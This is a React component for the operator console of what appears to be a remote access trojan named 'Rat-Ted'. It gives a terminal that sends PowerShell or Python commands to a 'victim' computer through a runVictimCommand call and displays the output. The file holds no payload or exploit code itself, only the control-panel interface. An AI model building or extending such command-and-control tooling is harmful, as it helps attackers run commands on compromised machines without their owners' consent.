import { FaTerminal } from "react-icons/fa";
import { runVictimCommand } from "../service/api.service";
import React, { useState } from "react";

type TerminalProps = {
  id: number;
  currentDirectory: string;
};

const Terminal: React.FC<TerminalProps> = ({ id, currentDirectory }) => {
  const [command, setCommand] = useState("");
  const [commands, setCommands] = useState<string[]>([]);

  const [responses, setResponses] = useState<CommandResultType[]>([]);
  const [selectedLanguage, setSelectedLanguage] = useState("Powershell"); // Default language

  const executeCommand = async () => {
    try {
      const result = await runVictimCommand(
        id,
        command,
        selectedLanguage.toLowerCase()
      );
      const newResponse: CommandResultType = result.data.output;
      // this is currently a string, turn it into an object
      console.log(newResponse);
      setResponses([...responses, newResponse]);
      setCommands([...commands, command]);
      setCommand("");
    } catch (error) {
      setResponses([
        ...responses,
        {
          result: "An error occurred while executing the command.",
          error: "Error",
        },
      ]);
    }
  };

  return (
    <div className="rounded-lg p-4 shadow-md mt-4 bg-slate-950 text-white">
      <div className="flex items-center text-green-400">
        <FaTerminal className="text-3xl mr-2" />
        <div>
          <h1 className="text-xl font-bold text-green-400">Terminal:</h1>
          <p className="text-gray-500 dark:text-gray-400">
            Execute commands on the remote computer.
          </p>
        </div>

        {/* Dropdown button for selecting the command language */}
        <div className="ml-auto relative">
          <select
            className="bg-slate-950 border border-green-400 text-green-400 p-2 rounded-lg"
            value={selectedLanguage}
            onChange={(e) => setSelectedLanguage(e.target.value)}
          >
            <option value="Powershell">Powershell</option>
            <option value="Python">Python</option>
            {/* Add more options as needed */}
          </select>
        </div>
      </div>

      {/* CMD-style terminal output */}
      <div className="p-4">
        <pre className="whitespace-pre-wrap flex flex-col gap-y-12">
          <div>
            Rat-Ted [Version 1.0.0] (c) 2023 Rat-Ted Corporation. All rights
            reserved.
          </div>

          {commands.map((command, index) => (
            <div key={index} className="flex flex-col gap-y-2">
              {command}
              <span className={`${responses[index].error && "text-red-600"}`}>
                {responses[index].result}
              </span>
            </div>
          ))}
        </pre>
      </div>

      {/* CMD-style terminal input and button */}
      <div className="mt-4">
        <div className="flex items-center gap-2 bg-slate-950 rounded-lg p-2">
          <span className="text-green-400">{currentDirectory}&gt;</span>
          <textarea
            className="flex-grow text-green-400 bg-transparent focus:outline-none"
            placeholder="Enter command here..."
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === "Enter" && !e.shiftKey) {
                e.preventDefault();
                executeCommand();
              }
            }}
          ></textarea>
          <button
            className="py-2 px-4 bg-green-400 hover:bg-green-500 text-black rounded-lg"
            onClick={(e) => {
              e.preventDefault();
              executeCommand();
            }}
          >
            Execute Command
          </button>
        </div>
      </div>
    </div>
  );
};

export default Terminal;
